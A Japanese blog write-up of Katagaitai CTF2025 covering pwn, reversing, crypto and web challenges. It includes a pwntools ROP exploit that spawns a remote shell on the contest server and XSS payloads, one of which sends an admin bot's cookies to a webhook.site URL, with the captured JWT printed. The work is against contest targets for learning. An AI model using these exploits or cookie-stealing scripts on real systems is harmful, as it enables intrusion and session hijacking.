+++
author = "Hugo Authors"
title = "Katagaitai CTF2025 Writeup"
date = "2025-01-26"
description = ""
tags = [
    "CTF",
    "writeup",
    "katagaitai",
]
categories = [
    "Security",
    "Programming",
]
image = "https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/srdnlen-ctf-2025/cover.png"
+++

2025/1/25 15:00(JST) - 2025/1/25 22:00(JST)で開催された Katagaitai CTF2025 に参加した．
<!--more-->
個人で参加し，結果は，4014 点で 82 人中 8 位だった．

https://www.nri-secure.co.jp/recruit/event/2025/0125ctf

## Pwn
### firstpwn (495 easy [8 Solves])
> バッファオーバーフローの脆弱性があるバイナリがリモートサーバ上で稼働しています。   
処理を奪ってsystem("/bin/sh\x00")を実行しましょう。  
nc ~  
chall  
vuln_func.c

以下の情報を取得したい．
1. pop rdi; ret; のアドレス
2. /bin/sh\x00のアドレス
3. retのアドレス
4. system関数のアドレス

#### PLTエントリの調べ方
system関数などの標準ライブラリ関数のPLTエントリはobjdumpコマンドを使用して以下のように求められる．
```
$ objdump -d -j.plt chall
...
0000000000401040 <system@plt>:
  401040:	ff 25 da 2f 00 00    	jmp    *0x2fda(%rip)        # 404020 <system@GLIBC_2.2.5>
  401046:	68 01 00 00 00       	push   $0x1
  40104b:	e9 d0 ff ff ff       	jmp    401020 <.plt>

0000000000401050 <printf@plt>:
  401050:	ff 25 d2 2f 00 00    	jmp    *0x2fd2(%rip)        # 404028 <printf@GLIBC_2.2.5>
  401056:	68 02 00 00 00       	push   $0x2
  40105b:	e9 c0 ff ff ff       	jmp    401020 <.plt>
...
```
よって，system関数のアドレスは`0x0000000000401040`である．

#### ROPガジェットの調べ方
pop rdi; ret;ガジェットやret;ガジェットのアドレスはROPgadgetというツールを用いて以下のように求められる．
```
$ ROPgadget --binary ~/Downloads/chall --only "pop|rdi|ret"
Gadgets information
============================================================
0x00000000004013bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004013be : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004013c0 : pop r14 ; pop r15 ; ret
0x00000000004013c2 : pop r15 ; ret
0x00000000004013bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004013bf : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040114d : pop rbp ; ret
0x00000000004013c3 : pop rdi ; ret
0x00000000004013c1 : pop rsi ; pop r15 ; ret
0x00000000004013bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret
0x0000000000401072 : ret 0x2f
0x00000000004011ea : ret 0x8948

Unique gadgets found: 13
```
よって，pop rdi; ret; のアドレスは`0x00000000004013c3`であり，retのアドレスは`0x000000000040101a`である．

#### /bin/sh\x00のアドレス
/bin/sh\x00の文字列のアドレスの探索は，gdbで適当に実行してから，findで見つける．
```
$ chmod +x chall
$ gdb -q chall
gef> b main
gef> r
gef> find /bin/sh\\x00
[+] Searching '/bin/sh\x00' in whole memory
[+] In '/home/krimm/Downloads/chall' (0x402000-0x403000 [r--])
  0x000000402008:    2f 62 69 6e 2f 73 68 00  00 5b 2a 5d 20 70 72 69    |  /bin/sh..[*] pri  |
[+] In '/home/krimm/Downloads/chall' (0x403000-0x404000 [r--])
  0x000000403008:    2f 62 69 6e 2f 73 68 00  00 5b 2a 5d 20 70 72 69    |  /bin/sh..[*] pri  |
[+] In '/usr/lib/x86_64-linux-gnu/libc.so.6' (0x7ffff7db0000-0x7ffff7dff000 [r--])
  0x7ffff7dcb42f:    2f 62 69 6e 2f 73 68 00  65 78 69 74 20 30 00 6e    |  /bin/sh.exit 0.n  |

```
よって，/bin/sh\x00の文字列のアドレスは`0x000000402008`である．

参考：
https://qiita.com/MachineHunter/items/9b954f7a0aee0a0a3cba

#### ペイロードの長さ
ペイロードの長さは，実行するとスタックを表示してくれているので，`0x00007ffe86d538d8 : 0x0000000000401174`
の部分がリターンアドレスだとわかる．よって，11*8=88バイトである．
```
$ nc ~ 9003
[+] Opening connection to pwn.katagaitai-ctf.com on port 9003: Done
[*] Switching to interactive mode
[*] print stack frame ... 
address            : value            
0x00007ffe86d53880 : 0x0000000000000001
0x00007ffe86d53888 : 0x00007ffe86d539d8
0x00007ffe86d53890 : 0x00007ffe86d539e8
0x00007ffe86d53898 : 0x0000000000401351
0x00007ffe86d538a0 : 0x0000000000000002
0x00007ffe86d538a8 : 0x00000000004013ad
0x00007ffe86d538b0 : 0x00007215bd5d12e8
0x00007ffe86d538b8 : 0x0000000000401360
0x00007ffe86d538c0 : 0x0000000000000000
0x00007ffe86d538c8 : 0xcafebabedeabbeef
0x00007ffe86d538d0 : 0x00007ffe86d538e0
0x00007ffe86d538d8 : 0x0000000000401174
0x00007ffe86d538e0 : 0x0000000000000000
0x00007ffe86d538e8 : 0x00007215bd404083
0x00007ffe86d538f0 : 0x00007215bd5cd6a0
0x00007ffe86d538f8 : 0x00007ffe86d539d8

[*] print registers ... 
 [-] RDI Register: 0x00007ffe86d53880
 [-] RSI Register: 0x00007ffe86d539d8
 [-] RDX Register: 0x00007ffe86d539e8

[*] Done ...
[*] Please input data in 'buf1' ...
```

以上より，Solver.pyを以下のようにして作成．
{{< code lang="python" title="Solver.py" hl_lines="" >}}
from pwn import *

target = remote("pwn.katagaitai-ctf.com", 9003)

system_plt = 0x0000000000401040
pop_rdi_ret = 0x00000000004013c3
ret = 0x000000000040101a
binsh = 0x000000402008

payload = b"A" * 88
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system_plt)

target.sendline(payload)
# print(target.recvall().decode())
target.interactive()
{{< /code >}}

実行すると，任意のコマンドが実行可能になり，flagが得られる．
```
$ python3 Solver.py
[+] Opening connection to pwn.katagaitai-ctf.com on port 9003: Done
[*] Switching to interactive mode
[*] print stack frame ... 
address            : value            
0x00007ffcbb5070c0 : 0x0000000000000001
0x00007ffcbb5070c8 : 0x00007ffcbb507218
0x00007ffcbb5070d0 : 0x00007ffcbb507228
0x00007ffcbb5070d8 : 0x0000000000401351
0x00007ffcbb5070e0 : 0x0000000000000002
0x00007ffcbb5070e8 : 0x00000000004013ad
0x00007ffcbb5070f0 : 0x0000783b053b82e8
0x00007ffcbb5070f8 : 0x0000000000401360
0x00007ffcbb507100 : 0x0000000000000000
0x00007ffcbb507108 : 0xcafebabedeabbeef
0x00007ffcbb507110 : 0x00007ffcbb507120
0x00007ffcbb507118 : 0x0000000000401174
0x00007ffcbb507120 : 0x0000000000000000
0x00007ffcbb507128 : 0x0000783b051eb083
0x00007ffcbb507130 : 0x0000783b053b46a0
0x00007ffcbb507138 : 0x00007ffcbb507218

[*] print registers ... 
 [-] RDI Register: 0x00007ffcbb5070c0
 [-] RSI Register: 0x00007ffcbb507218
 [-] RDX Register: 0x00007ffcbb507228

[*] Done ...
[*] Please input data in 'buf1' ...
$ ls
Makefile
chall
chall.c
flag
start.sh
$ cat flag
katagaitai-CTF{7h15_15_y0ur_f1r57_9WN!!!}
```

<!-- ### GOT Overwrite (500 medium [1 Solves])
> バッファオーバーフローの脆弱性があるバイナリがリモートサーバ上で稼働しています。  
「GOT Overwrite」という攻撃手法について調べてみましょう。  
nc ~ 

### BYOR (500 hard [1 Solves])
> バッファオーバフローの脆弱性があります。攻略しましょう。  
nc ~ -->

## Rev
### operand (451 medium [22 Solves])
> ちゃんと動かなそうなプログラムなのに動いてますね。。  
xorという関数が怪しいですね。どこが怪しいでしょうか。  
operand

実行ファイルをghidraに投げると，暗号化されたflagとそれにxor関数で処理していることがわかる．

```c
undefined8 main(void)
{
  size_t sVar1;
  long in_FS_OFFSET;
  int i;
  char flag [32];
  char buf [56];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  builtin_strncpy(flag,">4!424<!4<x\x16\x01\x13.\"=f\'f\nd`\n\'1dj(_",0x1f);
  write(1,"flag> ",7);
  read(0,buf,0x32);
  xor("00000000000000000000000000000");
  i = 0;
  while( true ) {
    sVar1 = strlen(flag);
    if (sVar1 <= (ulong)(long)i) break;
    if (buf[i] != flag[i]) {
      write(1,"You have wrong flag..\n",0x17);
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    i = i + 1;
  }
  write(1,"Congratulations!!\n",0x13);
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

void xor(void)
{
  size_t sVar1;
  char *str;
  int i;
  
  i = 0;
  while( true ) {
    sVar1 = strlen(str);
    if (sVar1 <= (ulong)(long)i) break;
    str[i] = str[i] ^ 0x55;
    i = i + 1;
  }
  return;
}
```

特に，xor関数では，それぞれの文字に`0x55`とxorを取っているだけなので，以下のように解読する．
{{< code lang="python" title="Solver.py" hl_lines="" >}}
input_str = ">4!424<!4<x\x16\x01\x13.\"=f\'f\nd`\n\'1dj(_"
flag = []
for char in input_str:
    xor_result = ord(char) ^ 0x55
    flag.append(chr(xor_result))
print(''.join(flag))
{{< /code >}}

`katagaitai-CTF{wh3r3_15_rd1?}`

<!-- ### nazonobasho (495 medium [8 Solves])
> 赤の〇で表示されたのがあなたです！！  
黄色の[]で表示された宝箱を取りに行きましょう！！  
※コンソール画面を大きくしないとうまく表示できません。  
"command> "と表示されたとき  
'a'で左に  
'd'で右に  
'w'で上に  
'x'で下に  
動きます。  
's'で現在の座標をセーブできます。  
'p'で全体マップを表示します。(コンソールの文字を小さくする必要があるかもしれません。)  
'q'でゲームを終了します。   -->


## Crypto
### triple prime number (200 easy [53 Solves])
> 非常に大きな素数p,qを使っているため、この暗号は解読不可能です。  
qはpのおおよそ3倍の大きさの素数になっています。  
output.txt  
xhall.py

$\sqrt{\frac{N}{3}}$ 付近を総当たりした．

{{< code lang="python" title="Solver.py" hl_lines="" >}}
from Crypto.Util.number import long_to_bytes
from Crypto.Util.number import isPrime
import math

N = 67065672690003311763317709419239610557390343983642475637401743672576109945257067184833335724739055507713911257315218712587814893083624350883742409846705280437477167123258389279794173962158743669272579645355673342245762921030115425496807817179463838289989203454462239442929037937280576079274015891379372111920942638362069541216440451571876835309164009534472257137288932986602402701138615446175231785642792848820669091022296147160056161442272348780482860974581364602714484270631008573473898498428385421074872452077465881960139871928561910298478867269284810190424497649782935570132183725497729691409916508813245062130717
e = 65537
c = 48141562923871083014787967622878906989794337644154518693891607304653086195283748066464626227387560498174312882600915530896311873451719919881013485188886552136171663560506892992061365053564941028961783007281608994591890724343626429488198602396064077068317352966231341078531074244714250131439327527702967234197174610978175451434403144143929967942519339212638940715118885947858572492615370041199900154549327069364947064186401270502244647235839653174778612836848667894682929935646780724078041869331796039547774517905373955566804586398816127667745198939820021666387133349877782922343576819256878925770428220409970820294598

def next_prime(n):
    while True:
        n += 1
        if isPrime(n):
            return n

N_ = N // 3
for i in range(-100, 100, 1):
    q = next_prime(int(math.isqrt(N_)) + i)
    p=N//q
    phi=(p-1)*(q-1)
    d=pow(e,-1,phi)
    m=pow(c,d,N)
    print(long_to_bytes(int(m)))
{{< /code >}}

`katagaitai-CTF{7w0_pr1m3_numb3r5_mu57_b3_1nd3p3nd3n7}`

### oracle service1 (387 medium-hard [33 Solves])
> ワード制限をバイパスできますか？その1  
nc ~  
service.py

任意の平文（Hex）の暗号文を聞けるオラクルが与えられる．
ソースコードより，復号結果が`b"katagaitai-CTF"`となる暗号文を入力するとflagが得られる．
しかし，暗号化では`b"katagaitai-CTF"`となる平文は制限されている．

{{< code lang="python" title="service.py" hl_lines="" >}}
from flag import FLAG
from Crypto.Util.number import *

MENU = """
1. Encryption.
2. Decryption.
3. Exit.
"""

# 平文を暗号化する関数
def encrypt(e, N):
    # 16進数形式でデータの入力を受け付けて、bytes型に変換
    try:
        message = bytes.fromhex(input("input your message (hex)> "))
    except Exception as e:
        print(e)
        print("Bye!!")
        exit(1)
    
    # データに "katagaitai-CTF"が含まれていないかチェック
    if b"katagaitai-CTF" in message:
        print("Contains restricted words!")
        return
    
    cipher = hex(pow(bytes_to_long(message), e, N))[2:]
    print(cipher)

# 暗号文を復号する関数
def decrypt(d, N):
    # 16進数形式で暗号文の入力を受け付けて、bytes型に変換
    try:
        cipher = input("input your cipher (hex)> ")
    except Exception as e:
        print(e)
        print("Bye!!")
        exit(1)

    c = int(cipher, 16)
    data = long_to_bytes(pow(c, d, N))
    
    # 暗号文の復号結果がkatagaitai-CTFの場合、FLAGを表示
    if data == b"katagaitai-CTF":
        print("Great!")
        print(f"FLAG is {FLAG}")
    else:
        print("Bad!")

def main():
    p = getStrongPrime(1024)
    q = getStrongPrime(1024)
    N = p * q
    phi = (p - 1) * (q - 1)
    e = 0x10001
    d = inverse(e, phi)
    
    print("=== Oracle Service1 ===\n")
    print(f"N = {N}")
    
    while True:
        print(MENU)
        choice = input("> ")
        if choice not in ["1", "2"]:
            print("Bye!!")
            exit(0)
            break
        if choice == "1":
            encrypt(e, N)
        if choice == "2":
            decrypt(d, N)
    
if __name__ == '__main__':
    main()
{{< /code >}}

RSAの暗号化では，$c=m^e\bmod N$ である．また，$(N+1) \bmod N = 1$ であるので，  
$$c \equiv m^e \equiv m^e \cdot 1 \equiv m^e \cdot 1^e \equiv m^e \cdot (N+1)^e \equiv (m \cdot (N+1))^e \bmod N$$
が成り立つので，
`b"katagaitai-CTF"`に $(N+1)$ を掛けたものを平文として暗号化すると，制限されることなく暗号化できる．

{{< code lang="python" title="Solver.py" hl_lines="" >}}
N = 17729623498209258078139145367274935313867758324944018326324892604168504326616208284063335154172848284406203010134162595593712311078350951547533585536359142406900347931338027783845099450965883367370765166102573115345962855785471216045220495308756900009327457877715335668777443907863030190824853647250421187258030207057532648388610447841349954757304835281208121287666162711615761012985625512480450856337967342612490058842436271628981005082512963478367593448029554297069913549724945492725271430062024907745868194294276347684290936085019563220334248546706582193768475398191292115680252033796487439716478505007387900281771

byte_string = b"katagaitai-CTF"
hex_string = byte_string.hex()
hex(int(hex_string, 16)*(N+1))
# 3ae926e8d3fc9722fd8b3201c295738e914c9aaca455de390d0fdca7ba68c99c641b2edc648a54217cea24c757c0005bc5e3905d1d3c3d99c6fac7cedc3b7a7c5653950e244d34f52194117384ad5f43e56aae937b383d1f24c85212dd76854ec6fd06c8094cbf728a25d173bb4929591e9d0610fba662e006766d3e1c7c64f7caf82e2d65bc2619c845dde1132bb58d8b6855fae42b3400918d185a511176d37fcb5fe39325d6873443bfc8696fa472b3627fce3756042948a530f6dc4473593281e05e3f1cb6de0d598d920eacf35b53455bf4af80986d31387f7f4612f329c0911969a6ec5ca8402027e0e5e5b993a81aa3efd7390b6ba93fa8b179360af046ae6cd822351e3a30f972a07108
{{< /code >}}

以下のように，flagが得られる．

```
$ nc crypto.katagaitai-ctf.com 9011
=== Oracle Service1 ===

N = 17729623498209258078139145367274935313867758324944018326324892604168504326616208284063335154172848284406203010134162595593712311078350951547533585536359142406900347931338027783845099450965883367370765166102573115345962855785471216045220495308756900009327457877715335668777443907863030190824853647250421187258030207057532648388610447841349954757304835281208121287666162711615761012985625512480450856337967342612490058842436271628981005082512963478367593448029554297069913549724945492725271430062024907745868194294276347684290936085019563220334248546706582193768475398191292115680252033796487439716478505007387900281771

1. Encryption.
2. Decryption.
3. Exit.

> 1
input your message (hex)> 3ae926e8d3fc9722fd8b3201c295738e914c9aaca455de390d0fdca7ba68c99c641b2edc648a54217cea24c757c0005bc5e3905d1d3c3d99c6fac7cedc3b7a7c5653950e244d34f52194117384ad5f43e56aae937b383d1f24c85212dd76854ec6fd06c8094cbf728a25d173bb4929591e9d0610fba662e006766d3e1c7c64f7caf82e2d65bc2619c845dde1132bb58d8b6855fae42b3400918d185a511176d37fcb5fe39325d6873443bfc8696fa472b3627fce3756042948a530f6dc4473593281e05e3f1cb6de0d598d920eacf35b53455bf4af80986d31387f7f4612f329c0911969a6ec5ca8402027e0e5e5b993a81aa3efd7390b6ba93fa8b179360af046ae6cd822351e3a30f972a07108
388906f7068e0e555c0ed2bd74ffd431b5a1ab44b8f7fb1938a503401e532597af2cf87f45f93387bd9e4be28b3fa19fb464118b1344acecf8ab0d5c9c31c68e9977ffdf4734efe60280c01d9c1b4ed6088ac958351c4d26dc97e5f16aded4f701d83972d61dc341956f546852e835e429e5d28341888528129654864c58fef94885ac5c43768e928afd1dc2e60fbcd4f6f5ddc1dc00ec8a94ef9af08dc363adf38e2930ea5bb784cd673ee503d89a57176a59a97daf1040b342421474f248ec7ab5531795bc95e7bce9425fdc6358be5ee5d989a54ff3dfe3bab305f6f733bb6d62bd0ec7972b5ae646f1ab44755c919e07efd73ba444f4b68f7e48d783151d

1. Encryption.
2. Decryption.
3. Exit.

> 2
input your cipher (hex)> 388906f7068e0e555c0ed2bd74ffd431b5a1ab44b8f7fb1938a503401e532597af2cf87f45f93387bd9e4be28b3fa19fb464118b1344acecf8ab0d5c9c31c68e9977ffdf4734efe60280c01d9c1b4ed6088ac958351c4d26dc97e5f16aded4f701d83972d61dc341956f546852e835e429e5d28341888528129654864c58fef94885ac5c43768e928afd1dc2e60fbcd4f6f5ddc1dc00ec8a94ef9af08dc363adf38e2930ea5bb784cd673ee503d89a57176a59a97daf1040b342421474f248ec7ab5531795bc95e7bce9425fdc6358be5ee5d989a54ff3dfe3bab305f6f733bb6d62bd0ec7972b5ae646f1ab44755c919e07efd73ba444f4b68f7e48d783151d
Great!
FLAG is katagaitai-CTF{y0u_c4n_c4lcul473_mul71pl1c4710n_0nly}
```

### oracle service2 (479 medium-hard [15 Solves])
> ワード制限をバイパスできますか？その2  
nc ~   
service.py

先ほどはNが与えられたが，今度は与えられない．  
$a = 2^e \bmod N$ ，$b = 3^e \bmod N$，$c = 6^e \bmod N$ とする．このとき，  
$$ c = 6^e \bmod N = (2 \cdot 3)^e \bmod N = a\cdot b \bmod N$$
であるので，ある整数 $k$ を用いて，
$$c + k\cdot N = a\cdot b$$
よって，
$$k\cdot N = a\cdot b - c$$
が成り立つので，`b"katagaitai-CTF"`に $(k\cdot N+1)$ を掛けたものを平文として暗号化すると，制限されることなく暗号化できる．

## Web
### HTTP world Pt.1 (50 warmup [70 Solves])
> HTTPの世界を探訪する前に、HTMLの世界をおさらいしましょう。  
http://web.katagaitai-ctf.com/http/step1.php

ページのソースを表示すると，コメントにflagが含まれる．
```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HTTP World Pt.1</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black min-h-screen flex items-center justify-center">
    <div class="text-center p-8 bg-gray-900 rounded-lg shadow-xl border border-green-500 max-w-2xl w-full mx-4">
        <h1 class="text-4xl font-mono text-green-500 mb-8">
            Welcome to the HTTP World!
        </h1>
        <p class="text-gray-300 text-xl font-mono">
            The flag is missing.
            <!-- katagaitai-CTF{HT_of_HTML_and_HTTP_means_HyperText} -->
        </p>
    </div>
</body>
</html>
```

### HTTP world Pt.2 (50 warmup [68 Solves])
> 改めてHTTPの世界を探訪しましょう。フラグはレスポンスのどこかに隠されています。  
http://web.katagaitai-ctf.com/http/step2.php

レスポンスヘッダーに含まれている．
```
connection: keep-alive
content-type: text/html; charset=UTF-8
date: Sun, 26 Jan 2025 11:07:35 GMT
server: nginx/1.27.3
transfer-encoding: chunked
x-katagaitai-flag: katagaitai-CTF{header_shoulder_knees_and_toes_gaitai}
x-powered-by: PHP/8.1.31
```

### HTTP world Pt.3 (88 easy [55 Solves])
> アクセス先のミッションを達成して、4つの条件を満たすとフラグが取得できます。  
http://web.katagaitai-ctf.com/http/step3.php

アクセスし，Submit POST Requestボタンを押すと以下のようになった．残るは`PUT`と`DELETE`である．

![This is a image](https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im10.png)

Burp Suite Community Editionを用いて，以下のように`POST`の部分を`PUT`と`DELETE`にして送信する．
Cookieによって，どのオプションでアクセスしたかが記録されている．

![This is a image](https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im11.png)

4つとも実行するとレスポンスでflagが得られた．
```
        </ul>
        <p class="text-gray-300 text-xl font-mono mt-8">
            Congratulations!<br>The flag is <code>katagaitai-CTF{Gakkari_shite_Method_Method_shite}</code></p>
    </div>
</body>

</html>
```
`katagaitai-CTF{Gakkari_shite_Method_Method_shite}`

### Parroting (50 warmup [63 Solves])
> あなたの目的はalert()関数を呼び出すことです。  
http://web.katagaitai-ctf.com/xss_warmup/index.php?text=hello

入力フォームがある．問題文にあるように，alert()関数を呼び出すscriptを入力するとflagが表示された．

```
<script>alert()</script>
```

`katagaitai-CTF{:parrot:_Slack_Emoji_Alias_Has_Conflicted_So_Sad} `

### XSSNS Pt.1 (82 warmup [56 Solves])
> 本格的なXSSの問題に取り組む前に、CTF典型の報告機能を体験してもらいます。 「Report admin」のフォームにURLを投稿すると、管理者アカウントになりきったbotが指定のURLにアクセスしてくれます。 
この管理者アカウントのユーザ名が最初のフラグです。  
http://web.katagaitai-ctf.com/xss/

サイトにアクセスすると，LoginとRegisterのフォームがある．まず適当に登録する．

![This is a image](https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im03.png)

すると，My pageが表示される．
問題文にあるように，「Report admin」のフォームにURLを投稿すると、管理者アカウントになりきったbotが指定のURLにアクセスしてくれる．
My pageには，「Users visited you」にアクセスした人のユーザ名が表示されるようである．
問題文に管理者アカウントのユーザ名が最初のフラグと書いてあるので，自分のページのURLを投稿すればよさそう．

![This is a image](https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im04.png)

よって，以下のように入力して送信する．

![This is a image](https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im05.png)

Mu pageにもどると，flagが得られる．

![This is a image](https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im06.png)

`katagaitai-CTF{mixi_2_15_n0w_4v4114b13}`

### XSSNS Pt.2 (194 easy [33 Solves])
> 実践的なXSSに挑戦しましょう。  
今度の目的は管理者のユーザーエージェントを取得することです。  
先ほどと同じアプリを使用します。  
https://webhook.site/ を使用すると、「Your unique URL」に対するアクセス内容がすべて記録されるため、お手軽な誘導先として使用できます。  
http://web.katagaitai-ctf.com/xss/  

https://webhook.site/ で自分のURLをコピーしておく．
```
Your unique URL
https://webhook.site/861b7ef1-0e6e-4dc3-9c97-f69bb609c45f
```

My pageの「Post title」に指定のURLにリダイレクトするスクリプトを投稿する．
```
<script>window.location.href="https://webhook.site/861b7ef1-0e6e-4dc3-9c97-f69bb609c45f";</script>
```

その後，管理者アカウントbotがMy pageにアクセスするように先ほどと同様に以下のように入力して送信する．

![This is a image](https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im05.png)

https://webhook.site/ へアクセスすると，以下のようにbotのアクセス記録が確認できる．

![This is a image](https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im07.png)

`katagaitai-CTF{Mozilla_AppleWebKit_Gecko_Chrome_Safari_CHAOS}`

### XSSNS Pt.3 (226 medium [22 Solver])
> 今回のXSS集大成の課題は、管理者ユーザが作成した投稿を見ることです。  
先ほどと同じアプリを使用します。  
http://web.katagaitai-ctf.com/xss/  
管理者の投稿を見るためには、管理者になりすます必要があるということです。  
そもそもHTTPリクエストの中で、ユーザが誰であるかの特定はどのように行うのでしょうか。  

先ほどの指定のURLにリダイレクトするスクリプトに，Cookiesの内容を付与するようにする．
```
<script>
var cookies=document.cookie;
var redirectUrl = "https://webhook.site/861b7ef1-0e6e-4dc3-9c97-f69bb609c45f?cookies=" + encodeURIComponent(cookies);
window.location.href = redirectUrl;
</script>
```
My pageの「Post title」に指定のURLにリダイレクトするスクリプトを投稿する．
その後，管理者アカウントbotがMy pageにアクセスするように先ほどと同様に以下のように入力して送信する．
https://webhook.site/ へアクセスすると，以下のようにbotのアクセス記録が確認できる．

![This is a image](https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im08.png)

このことから，Cookiesは以下であることが確認できる．
```
token = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImthdGFnYWl0YWktQ1RGe21peGlfMl8xNV9uMHdfNHY0MTE0YjEzfSIsImlkIjoieVdCa1RoMjIwRkVaIiwiaWF0IjoxNzM3ODkzNjUyLCJleHAiOjE3Mzc4OTcyNTJ9.i5RcWrDgSeyTXFgyFGMk4aGljjuUQShVQuvc1an-pPw
```

このCookiesを指定して，Loginを押すとおそらく管理者アカウントのページに行けたが，投稿を見てもflagは見つからなかった．
まだゴールではないのだろうか．

![This is a image](https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im09.png)

### OpenAPI (133 easy [47 Solved])
> http://web.katagaitai-ctf.com/openapi/ping へリクエストすると、メッセージが帰ってきます。下記URLのドキュメントを隅々まで読んで見ながら、遊んでみてください。  
http://web.katagaitai-ctf.com/openapi/ui/#/Example/example_ping

このサイトをみると，`http://web.katagaitai-ctf.com/openapi/flag` へ以下のリクエストbodyをつけて送るとよさそう．
```
{
  "organizer": "Sample Company"
}
```

さらに，下の方に以下のように書かれており，ヒントのURLからorganizerは`NRI SecureTechnologies`だろう．
```
Organizer{
description:	
You must put the answer of the question below.

organizer*	string
What is the company name (english) of the organizer team? (Hint: https://www.nri-secure.com/about)

}
example: OrderedMap { "organizer": "Sample Company" }
```

Burp Suite Community Editionを用いて，以下のようにリクエストを作成し，送信するとflagが得られた．
```
POST /openapi/flag HTTP/1.1
Host: web.katagaitai-ctf.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: ja,en-US;q=0.9,en;q=0.8
Content-Type: application/json
Connection: close
Content-Length: 45

{ 
 "organizer": "NRI SecureTechnologies"
}
```

```
HTTP/1.1 200 OK
Server: nginx/1.27.3
Date: Sat, 25 Jan 2025 11:14:52 GMT
Content-Type: application/json
Content-Length: 97
Connection: close

{
  "message": "Correct! The flag is katagaitai-CTF{API_d0cum3n74710n_1s_3xtr3m31y_1mp0r74n7}"
}

```

<!-- ### WAF bypass (250 medium [3 Solves])
> WAF (Web Application Firewall) が通信を中継しています。 katagaitai-CTF{...} という文字列を見つけると [censored] に変換してしまうようです。  
waf_source.zip はWAFのソースコードです。  
http://web.katagaitai-ctf.com/http/step5.html  
index.js のソースコードから、正規表現によって katagaitai-CTF\{.*\} を置換していることがわかります。   -->



